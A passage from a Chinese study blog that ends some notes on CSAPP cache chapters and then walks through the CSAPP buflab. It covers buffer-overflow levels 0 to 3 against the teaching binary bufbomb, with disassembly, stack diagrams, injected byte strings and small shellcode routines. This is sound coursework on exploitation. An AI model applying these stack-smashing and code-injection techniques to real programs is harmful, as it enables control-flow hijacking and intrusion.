title="写的情况就要复杂一些了："></a>写的情况就要复杂一些了：</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616201410777.png" alt="image-20210616201410777"></p><h4 id="6-4-6-一个真实的高速缓存层次结构的解剖"><a href="#6-4-6-一个真实的高速缓存层次结构的解剖" class="headerlink" title="6.4.6 一个真实的高速缓存层次结构的解剖"></a>6.4.6 一个真实的高速缓存层次结构的解剖</h4><ul><li>既保存指令又包括数据的高速缓存称为<strong>统一的高速缓存</strong>（unified cache)</li></ul><h4 id="6-4-7-高速缓存参数的性能影响"><a href="#6-4-7-高速缓存参数的性能影响" class="headerlink" title="6.4.7 高速缓存参数的性能影响"></a>6.4.7 高速缓存参数的性能影响</h4><ul><li>有许多指标来衡量高速缓存的性能：<br><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616201749638.png" alt="image-20210616201749638"></li></ul><ol><li><p>高速缓存大小的影响</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616201856220.png" alt="image-20210616201856220"></p></li><li><p>块大小的影响</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616201910591.png" alt="image-20210616201910591"></p></li><li><p>相联度的影响</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616202352188.png" alt="image-20210616202352188"></p></li><li><p>写策略的影响</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616202616055.png" alt="image-20210616202616055"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616202634465.png" alt="image-20210616202634465"></p></li></ol><h3 id="6-5-编写高速缓存友好的代码"><a href="#6-5-编写高速缓存友好的代码" class="headerlink" title="6.5 编写高速缓存友好的代码"></a>6.5 编写高速缓存友好的代码</h3><ul><li><strong>让最常见的情况运行得快。</strong></li><li><strong>尽量减小每个循环内部的缓存不命中数量。</strong></li></ul><h3 id="6-6-综合：高速缓存对程序性能的影响"><a href="#6-6-综合：高速缓存对程序性能的影响" class="headerlink" title="6.6 综合：高速缓存对程序性能的影响"></a>6.6 综合：高速缓存对程序性能的影响</h3><h4 id="6-6-1-存储器山"><a href="#6-6-1-存储器山" class="headerlink" title="6.6.1 存储器山"></a>6.6.1 存储器山</h4><h4 id="6-6-2-重新排列循环以提高空间局部性"><a href="#6-6-2-重新排列循环以提高空间局部性" class="headerlink" title="6.6.2 重新排列循环以提高空间局部性"></a>6.6.2 重新排列循环以提高空间局部性</h4><h4 id="6-6-3-在程序中利用局部性"><a href="#6-6-3-在程序中利用局部性" class="headerlink" title="6.6.3 在程序中利用局部性"></a>6.6.3 在程序中利用局部性</h4><h3 id="6-7-小结"><a href="#6-7-小结" class="headerlink" title="6.7 小结"></a>6.7 小结</h3><h2 id="第7章-链接"><a href="#第7章-链接" class="headerlink" title="第7章 链接"></a>第7章 链接</h2>]]></content>
    
    
    <categories>
      
      <category>《深入理解计算机系统》</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深入理解计算机系统</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-buflab</title>
    <link href="/2021/05/01/buflab/"/>
    <url>/2021/05/01/buflab/</url>
    
    <content type="html"><![CDATA[<h1 id="buflab"><a href="#buflab" class="headerlink" title="buflab"></a>buflab</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>​    详细了解IA-32调用惯例和堆栈结构。它涉及对lab目录中的可执行文件bufbomb应用一系列缓冲区溢出攻击。</p><h2 id="实验环境和工具"><a href="#实验环境和工具" class="headerlink" title="实验环境和工具"></a>实验环境和工具</h2><p>​    ubuntu 12.04.5 (32位) ；</p><p>​    gdb 7.4 ；</p><h2 id="实验内容及操作步骤"><a href="#实验内容及操作步骤" class="headerlink" title="实验内容及操作步骤"></a>实验内容及操作步骤</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="阅读Readme-txt和buflab-writeup-pdf的前几页"><a href="#阅读Readme-txt和buflab-writeup-pdf的前几页" class="headerlink" title="阅读Readme.txt和buflab-writeup.pdf的前几页"></a>阅读Readme.txt和buflab-writeup.pdf的前几页</h4><p>按照Readme.txt的要求，任意输入一个字符作为userid。使用makecookie生成cookie。我这里输入的字符为h，得到<code>cookie:0x20083f2f</code>。</p><p><img src="/2021/05/01/buflab/image-20210531221833088-1625461218128.png" alt="image-20210531221833088"></p><h4 id="在linux下解压buflab-handout-tar-gz"><a href="#在linux下解压buflab-handout-tar-gz" class="headerlink" title="在linux下解压buflab-handout.tar.gz"></a>在linux下解压buflab-handout.tar.gz</h4><h3 id="Level-0-Candle-10-pts"><a href="#Level-0-Candle-10-pts" class="headerlink" title="Level 0: Candle (10 pts)"></a>Level 0: Candle (10 pts)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <br>&#123;<br><span class="hljs-type">int</span> val;<br><span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span> <br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> local = uniqueval();<br><br>val = getbuf();<br><br><span class="hljs-comment">/* Check for corrupted stack */</span> <br><span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>); <br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val); <br>validate(<span class="hljs-number">3</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h4><p>​    让BUFBOMB在<code>getbuf</code>执行其<code>return</code>语句时执行<code>smoke</code>的代码，而不是返回<code>test</code>。</p><p>​    注意：利用漏洞字符串还可能损坏堆栈中与此阶段不直接相关的部分，但这不会导致问题，因为冒烟会导致程序直接退出。</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>​    <code>getbuf()</code>的反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function getbuf:<br>   0x08049262 &lt;+0&gt;:push   %ebp<br>   0x08049263 &lt;+1&gt;:mov    %esp,%ebp<br>   0x08049265 &lt;+3&gt;:sub    $0x38,%esp<br>   0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax<br>   0x0804926b &lt;+9&gt;:mov    %eax,(%esp)<br>   0x0804926e &lt;+12&gt;:call   0x8048c32 &lt;Gets&gt;<br>   0x08049273 &lt;+17&gt;:mov    $0x1,%eax<br>   0x08049278 &lt;+22&gt;:leave  ;恢复旧ebp<br>   0x08049279 &lt;+23&gt;:ret    ;返回地址出栈，存储在eip中<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>由<code>lea    -0x28(%ebp),%eax</code>和<code>mov    %eax,(%esp)</code>可知，<code>ebp-0x28</code>的地址为<code>Gets()</code>函数的参数。<code>Gets()</code>将以该地址为起点向地址增大的方向保存字符。<code>getbuf()</code>的部分栈帧示意图如下：</p><p><img src="/2021/05/01/buflab/image-20210601102016862-1625461220546.png" alt="image-20210601102016862"></p></li><li><p>因此需要将<code>getbuf()</code>的返回地址覆盖为<code>smoke()第一条语句的地址</code>。<code>smoke()</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function smoke:<br>   0x08048e0a &lt;+0&gt;:push   %ebp<br>   0x08048e0b &lt;+1&gt;:mov    %esp,%ebp<br>   0x08048e0d &lt;+3&gt;:sub    $0x18,%esp<br>   0x08048e10 &lt;+6&gt;:movl   $0x804a2fe,0x4(%esp)<br>   0x08048e18 &lt;+14&gt;:movl   $0x1,(%esp)<br>   0x08048e1f &lt;+21&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048e24 &lt;+26&gt;:movl   $0x0,(%esp)<br>   0x08048e2b &lt;+33&gt;:call   0x8049280 &lt;validate&gt;<br>   0x08048e30 &lt;+38&gt;:movl   $0x0,(%esp)<br>   0x08048e37 &lt;+45&gt;:call   0x80488d0 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><p>首地址为<code>0x08048e0a</code>。由于<code>0x0a</code>为<code>&#39;\n&#39;</code>，故选用<code>0x08048e0b</code>注入。</p><p>构造的字符串为（40+4）个字符（除了0x0a以外的任意字符），再加上<code>0b 8e 04 08</code>(小端法)。txt文件如下：</p><p><img src="/2021/05/01/buflab/image-20210531220802038-1625461222317.png" alt="image-20210531220802038"></p></li></ul><h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h4><p><img src="/2021/05/01/buflab/image-20210531221856751-1625461140489-1625461223465.png" alt="image-20210531221856751"></p><h3 id="Level-1-Sparkler-10-pts"><a href="#Level-1-Sparkler-10-pts" class="headerlink" title="Level 1: Sparkler (10 pts)"></a>Level 1: Sparkler (10 pts)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> <br>&#123;<br><span class="hljs-keyword">if</span> (val == cookie) <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); <br>        validate(<span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val); <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="目标：-1"><a href="#目标：-1" class="headerlink" title="目标："></a>目标：</h4><p>​        与Level 0类似，让<code>BUFBOMB</code>执行<code>fizz</code>的代码，而不是返回<code>test</code>。但是，您必须使它看起来像fizz，就好像传递了cookie作为它的参数。</p><h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h4><p><code>fizz</code>的反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function fizz:<br>   0x08048daf &lt;+0&gt;:push   %ebp;esp=esp-4<br>   0x08048db0 &lt;+1&gt;:mov    %esp,%ebp;保存esp的值到ebp<br>   0x08048db2 &lt;+3&gt;:sub    $0x18,%esp<br>   0x08048db5 &lt;+6&gt;:mov    0x8(%ebp),%eax;参数=M[ebp+8]<br>   0x08048db8 &lt;+9&gt;:cmp    0x804d104,%eax<br>   0x08048dbe &lt;+15&gt;:jne    0x8048de6 &lt;fizz+55&gt;<br>   0x08048dc0 &lt;+17&gt;:mov    %eax,0x8(%esp)<br>   0x08048dc4 &lt;+21&gt;:movl   $0x804a2e0,0x4(%esp)<br>   0x08048dcc &lt;+29&gt;:movl   $0x1,(%esp)<br>   0x08048dd3 &lt;+36&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048dd8 &lt;+41&gt;:movl   $0x1,(%esp)<br>   0x08048ddf &lt;+48&gt;:call   0x8049280 &lt;validate&gt;<br>   0x08048de4 &lt;+53&gt;:jmp    0x8048dfe &lt;fizz+79&gt;<br>   0x08048de6 &lt;+55&gt;:mov    %eax,0x8(%esp)<br>   0x08048dea &lt;+59&gt;:movl   $0x804a4d4,0x4(%esp)<br>   0x08048df2 &lt;+67&gt;:movl   $0x1,(%esp)<br>   0x08048df9 &lt;+74&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048dfe &lt;+79&gt;:movl   $0x0,(%esp)<br>   0x08048e05 &lt;+86&gt;:call   0x80488d0 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>由<code>mov    0x8(%ebp),%eax</code>可知，此时<code>ebp+0x8</code>的地址保存的是<code>fizz()</code>的参数。其余类似Level0。更改<code>getbuf()</code>的返回地址为<code>fizz()</code>的入口地址后，进入<code>fizz()</code>前的部分栈帧示意图如下。进入fizz()后，esp的值加4，之后<code>push   %ebp</code>，esp的值减4，再由<code>mov    %esp,%ebp</code>，我们可以确定<code>fizz()</code>的参数的地址。</p><p><img src="/2021/05/01/buflab/image-20210601164519079.png" alt="image-20210601164519079"></p></li><li><p>构造字符串为（40+4）个字符（除了0x0a以外的任意字符），加上<code>af 8d 04 08</code>（<code>fizz()</code>的入口地址，小端法），再加上4个字符<br>（除了0x0a以外的任意字符），最后加上cookie：<code>2f 3f 08 20</code>（小端法）。txt文件如下：</p><p><img src="/2021/05/01/buflab/image-20210601110032585.png" alt="image-20210601110032585"></p></li></ul><h4 id="结果：-1"><a href="#结果：-1" class="headerlink" title="结果："></a>结果：</h4><p><img src="/2021/05/01/buflab/image-20210601110124902.png" alt="image-20210601110124902"></p><h3 id="Level-2-Firecracker-15-pts"><a href="#Level-2-Firecracker-15-pts" class="headerlink" title="Level 2: Firecracker (15 pts)"></a>Level 2: Firecracker (15 pts)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> global_value = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bang</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> &#123;<br><span class="hljs-keyword">if</span> (global_value == cookie) &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value); <br>        validate(<span class="hljs-number">2</span>);<br>&#125; <span class="hljs-keyword">else</span> <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="目标：-2"><a href="#目标：-2" class="headerlink" title="目标："></a>目标：</h4><p>​        与级别0和1类似，让<code>BUFBOMB</code>执行<code>bang</code>的代码，而不是返回<code>test</code>。但在此之前，必须将全局变量<code>global_value</code>设置为用户id的<code>cookie</code>。攻击代码应该设置全局变量，将<code>bang</code>的地址推送到堆栈上，然后执行<code>ret</code>指令以跳转到<code>bang</code>的代码。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p><code>bang</code>的反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function bang:<br>   0x08048d52 &lt;+0&gt;:push   %ebp<br>   0x08048d53 &lt;+1&gt;:mov    %esp,%ebp<br>   0x08048d55 &lt;+3&gt;:sub    $0x18,%esp<br>   0x08048d58 &lt;+6&gt;:mov    0x804d10c,%eax<br>   0x08048d5d &lt;+11&gt;:cmp    0x804d104,%eax;比较地址0x804d10c和0x804d104所存的值<br>   0x08048d63 &lt;+17&gt;:jne    0x8048d8b &lt;bang+57&gt;<br>   0x08048d65 &lt;+19&gt;:mov    %eax,0x8(%esp)<br>   0x08048d69 &lt;+23&gt;:movl   $0x804a4ac,0x4(%esp)<br>   0x08048d71 &lt;+31&gt;:movl   $0x1,(%esp)<br>   0x08048d78 &lt;+38&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d7d &lt;+43&gt;:movl   $0x2,(%esp)<br>   0x08048d84 &lt;+50&gt;:call   0x8049280 &lt;validate&gt;<br>   0x08048d89 &lt;+55&gt;:jmp    0x8048da3 &lt;bang+81&gt;<br>   0x08048d8b &lt;+57&gt;:mov    %eax,0x8(%esp)<br>   0x08048d8f &lt;+61&gt;:movl   $0x804a2c2,0x4(%esp)<br>   0x08048d97 &lt;+69&gt;:movl   $0x1,(%esp)<br>   0x08048d9e &lt;+76&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048da3 &lt;+81&gt;:movl   $0x0,(%esp)<br>   0x08048daa &lt;+88&gt;:call   0x80488d0 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li>查看地址0x804d10c的值和0x804d104的值，得到它们分别为<code>global_value</code>和<code>cookie</code>的值。</li></ul><p><img src="/2021/05/01/buflab/image-20210601164928822.png" alt="image-20210601164928822"></p><ul><li><p>而<code>getbuf</code>中的<code>ebp</code>位置为<code>0x55683610</code>（如下图），显然无法直接覆盖。</p><p><img src="/2021/05/01/buflab/image-20210601165635051.png" alt="image-20210601165635051"></p></li><li><p>故可以编写汇编代码，然后把它们转换为字符编码放入堆栈中，以完成需要的操作。汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">/*bang.s*/<br>mov 0x804d104,%eax/*将cookie保存到eax*/<br>mov %eax,0x804d10c/*将global_value设置为cookie的值*/<br>push$0x08048d52/*bang的函数入口地址入栈*/<br>ret/*返回，进入bang函数*/<br></code></pre></div></td></tr></table></figure></li><li><p>通过指令将.s文件编译为.o文件，查看反汇编代码，共16个字节：</p><p><img src="/2021/05/01/buflab/image-20210601171331126.png" alt="image-20210601171331126"></p></li><li><p>我们可以把这段代码从<code>buf</code>的起始位置开始存放，而把<code>getbuf</code>的返回地址更改为<code>buf</code>的起始地址，以执行这段代码。经调试<code>getbuf</code>，<code>buf</code>的起始地址为：<code>0x556835b8</code>。</p><p><img src="/2021/05/01/buflab/image-20210601172034515.png" alt="image-20210601172034515"></p></li><li><p>更改后的栈帧示意图如下：</p><p><img src="/2021/05/01/buflab/image-20210601194717582.png" alt="image-20210601194717582"></p></li><li><p>故注入的字符串为代码的字符编码（共16个字节）+28个字节（除了0x0a以外的任意字符）+<code>b8 35 68 55</code>（buf的起始地址的小端法表示）。txt文件如下：</p><p><img src="/2021/05/01/buflab/image-20210601173336057.png" alt="image-20210601173336057"></p></li></ul><h4 id="结果：-2"><a href="#结果：-2" class="headerlink" title="结果："></a>结果：</h4><p><img src="/2021/05/01/buflab/image-20210601173259876.png" alt="image-20210601173259876"></p><h3 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite (20 pts)"></a>Level 3: Dynamite (20 pts)</h3><p><code>test</code>的c代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <br>&#123;<br><span class="hljs-type">int</span> val;<br><span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span> <br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> local = uniqueval();<br><br>val = getbuf();<br><br><span class="hljs-comment">/* Check for corrupted stack */</span> <br><span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>); <br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val); <br>validate(<span class="hljs-number">3</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>test</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function test:<br>   0x08048e3c &lt;+0&gt;:push   %ebp<br>   0x08048e3d &lt;+1&gt;:mov    %esp,%ebp<br>   0x08048e3f &lt;+3&gt;:push   %ebx<br>   0x08048e40 &lt;+4&gt;:sub    $0x24,%esp<br>   0x08048e43 &lt;+7&gt;:call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048e48 &lt;+12&gt;:mov    %eax,-0xc(%ebp)<br>   0x08048e4b &lt;+15&gt;:call   0x8049262 &lt;getbuf&gt;<br>   0x08048e50 &lt;+20&gt;:mov    %eax,%ebx<br>   0x08048e52 &lt;+22&gt;:call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048e57 &lt;+27&gt;:mov    -0xc(%ebp),%edx<br>   0x08048e5a &lt;+30&gt;:cmp    %edx,%eax<br>   0x08048e5c &lt;+32&gt;:je     0x8048e74 &lt;test+56&gt;<br>   0x08048e5e &lt;+34&gt;:movl   $0x804a460,0x4(%esp)<br>   0x08048e66 &lt;+42&gt;:movl   $0x1,(%esp)<br>   0x08048e6d &lt;+49&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048e72 &lt;+54&gt;:jmp    0x8048eba &lt;test+126&gt;<br>   0x08048e74 &lt;+56&gt;:cmp    0x804d104,%ebx<br>   0x08048e7a &lt;+62&gt;:jne    0x8048ea2 &lt;test+102&gt;<br>   0x08048e7c &lt;+64&gt;:mov    %ebx,0x8(%esp)<br>   0x08048e80 &lt;+68&gt;:movl   $0x804a31a,0x4(%esp)<br>   0x08048e88 &lt;+76&gt;:movl   $0x1,(%esp)<br>   0x08048e8f &lt;+83&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048e94 &lt;+88&gt;:movl   $0x3,(%esp)<br>   0x08048e9b &lt;+95&gt;:call   0x8049280 &lt;validate&gt;<br>   0x08048ea0 &lt;+100&gt;:jmp    0x8048eba &lt;test+126&gt;<br>   0x08048ea2 &lt;+102&gt;:mov    %ebx,0x8(%esp)<br>   0x08048ea6 &lt;+106&gt;:movl   $0x804a337,0x4(%esp)<br>   0x08048eae &lt;+114&gt;:movl   $0x1,(%esp)<br>   0x08048eb5 &lt;+121&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048eba &lt;+126&gt;:add    $0x24,%esp<br>   0x08048ebd &lt;+129&gt;:pop    %ebx<br>   0x08048ebe &lt;+130&gt;:pop    %ebp<br>   0x08048ebf &lt;+131&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><h4 id="目标：-3"><a href="#目标：-3" class="headerlink" title="目标："></a>目标：</h4><p>​        提供一个漏洞字符串，该字符串将导致<code>getbuf</code>将<code>cookie</code>返回到<code>test</code>，而不是值1。可以在<code>test</code>的代码中看到，这将导致程序运行“Boom！”。</p><p>​        漏洞字符串将<code>cookie</code>设置为返回值的同时，应恢复任何损坏的状态，在堆栈上设定正确的返回地址，并执行<code>ret</code>指令以真正返回<code>test</code>。</p><h4 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h4><ul><li><p><code>getbuf</code>的返回值保存在<code>eax</code>中，故注入的字符串应执行操作将getbuf中<code>eax</code>的值设为<code>cookie</code>的值。同时返回到<code>test</code>的<code>call   0x8049262 &lt;getbuf&gt;</code>之后的位置，同时注入<code>buf</code>时应让保存的旧<code>ebp</code>保持原值不变。</p></li><li><p>编写汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">mov$0x20083f2f,%eax/*将cookie的值保存在eax中*/<br>push$0x08048e50/*test的call &lt;getbuf&gt;之后的地址入栈*/<br>ret/*返回*/<br></code></pre></div></td></tr></table></figure></li><li><p>输入指令，反汇编得机器码如下，共11个字节：</p><p><img src="/2021/05/01/buflab/image-20210601193213300.png" alt="image-20210601193213300"></p><p><img src="/2021/05/01/buflab/image-20210601201352918-1625461248265.png" alt="image-20210601201352918"></p></li></ul><ul><li>我们可以把这段代码从<code>buf</code>的起始位置开始存放，而把<code>getbuf</code>的返回地址更改为<code>buf</code>的起始地址，以执行这段代码。与Level 2一样，<code>buf</code>的起始地址为：<code>0x556835b8</code>。</li><li>同时旧<code>ebp</code>应保持原值不变，调试查看得<code>getbuf</code>保存的<code>ebp</code>的值为<code>0x55683610</code></li></ul><p><img src="/2021/05/01/buflab/image-20210602084151289.png" 